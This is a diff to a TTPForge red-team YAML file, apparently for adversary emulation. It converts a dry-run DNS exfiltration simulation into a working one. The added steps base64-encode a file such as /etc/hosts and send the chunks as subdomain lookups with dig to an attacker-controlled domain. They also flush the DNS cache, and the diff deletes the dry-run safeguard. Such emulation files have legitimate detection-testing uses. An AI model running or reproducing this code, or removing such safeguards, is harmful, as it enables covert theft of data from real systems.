@@ -1,11 +1,12 @@
 ---
 api_version: 2.0
 uuid: c9d0e1f2-a3b4-4c5d-6e7f-8091a2b3c4d5
-name: DNS Exfiltration Simulation
+name: DNS Exfiltration
 authors:
 - TTPForge
 description: |
-  Simulates data exfiltration through DNS queries
+  Exfiltrate data through DNS queries by encoding file contents as DNS subdomain
+  labels and sending them as lookups to an attacker-controlled DNS server.
 mitre:
   tactics:
   - TA0010 Exfiltration
@@ -20,53 +21,60 @@ args:
 - name: data_file
   description: File to exfiltrate via DNS
   type: string
-  default: /tmp/.staging/data.tar.gz
+  default: /etc/hosts
 - name: dns_server
-  description: Attacker-controlled DNS server
+  description: Attacker-controlled DNS domain to query
   type: string
-  default: dns.attacker.example.com
+  default: exfil.example.com
 - name: chunk_size
-  description: Size of data chunks (bytes)
+  description: Size of data chunks in characters per DNS label
   type: string
   default: '32'
-- name: dry_run
-  description: Enable dry-run mode
-  type: string
-  default: 'true'
 steps:
-- name: Read and prepare data
+- name: prepare_data_for_exfiltration
+  description: Read and base64 encode the target file for DNS transport
   inline: |
     if [ -f '{{ .Args.data_file }}' ]; then
       echo "File size: $(du -h '{{ .Args.data_file }}' | cut -f1)"
-      echo "Chunk size: {{ .Args.chunk_size }} bytes"
-      chunks=$(($(stat -f%z '{{ .Args.data_file }}' 2>/dev/null || echo 0) / {{ .Args.chunk_size }} + 1))
-      echo "Estimated DNS queries: $chunks"
+      base64 < '{{ .Args.data_file }}' | tr -d '\n' > /tmp/dns_exfil_encoded.txt
+      encoded_size=$(wc -c < /tmp/dns_exfil_encoded.txt)
+      echo "Encoded size: ${encoded_size} bytes"
+      chunks=$(( encoded_size / {{ .Args.chunk_size }} + 1 ))
+      echo "Will send ${chunks} DNS queries"
     else
-      echo "WARNING: Data file not found"
+      echo "ERROR: File not found: {{ .Args.data_file }}"
+      exit 1
     fi
-- name: Generate base64 encoded chunks
+
+- name: send_dns_exfiltration_queries
+  description: Send encoded data chunks as DNS subdomain queries
   inline: |
-    if [ -f '{{ .Args.data_file }}' ]; then
-      echo "Base64 encoded size:"
-      base64 < '{{ .Args.data_file }}' | wc -c
-      echo "First chunk preview:"
-      base64 < '{{ .Args.data_file }}' | head -c 100
-      echo ""
-    fi
-- name: Prepare DNS queries
+    encoded=$(cat /tmp/dns_exfil_encoded.txt)
+    total=${#encoded}
+    chunk_size={{ .Args.chunk_size }}
+    offset=0
+    seq_num=0
+    while [ $offset -lt $total ]; do
+      chunk=$(echo "$encoded" | cut -c$((offset+1))-$((offset+chunk_size)))
+      safe_chunk=$(echo "$chunk" | tr '+/=' '-_~')
+      dig +short "${safe_chunk}.${seq_num}.{{ .Args.dns_server }}" A 2>/dev/null || true
+      seq_num=$((seq_num + 1))
+      offset=$((offset + chunk_size))
+      [ $seq_num -le 5 ] && echo "Sent chunk ${seq_num}: ${safe_chunk:0:16}..."
+      [ $seq_num -eq 6 ] && echo "... continuing ..."
+    done
+    echo "Exfiltration complete: sent ${seq_num} DNS queries"
+
+- name: verify_dns_exfiltration
+  description: Verify DNS queries were sent by checking resolver cache
   inline: |
-    if [ '{{ .Args.dry_run }}' = 'true' ]; then
-      echo "DRY RUN: DNS Exfiltration Simulation"
-      echo "Target DNS: {{ .Args.dns_server }}"
-      echo "Sample DNS queries:"
-      echo "  nslookup data0.exfil.{{ .Args.dns_server }}"
-      echo "  nslookup data1.exfil.{{ .Args.dns_server }}"
-      echo "  nslookup data2.exfil.{{ .Args.dns_server }}"
-    else
-      echo "Simulating DNS queries (dry-run only)"
-    fi
+    echo "DNS queries sent to {{ .Args.dns_server }} subdomains"
+    echo "Total chunks sent: $(cat /tmp/dns_exfil_encoded.txt | wc -c | xargs echo | awk -v cs={{ .Args.chunk_size }} '{print int($1/cs)+1}')"
+    dscacheutil -flushcache 2>/dev/null || true
   cleanup:
-    inline: rm -f /tmp/test_dns_data.txt
+    inline: |
+      rm -f /tmp/dns_exfil_encoded.txt
+
 tests:
-- name: dry_run_test
+- name: dns_exfiltration_test
   dry_run: true
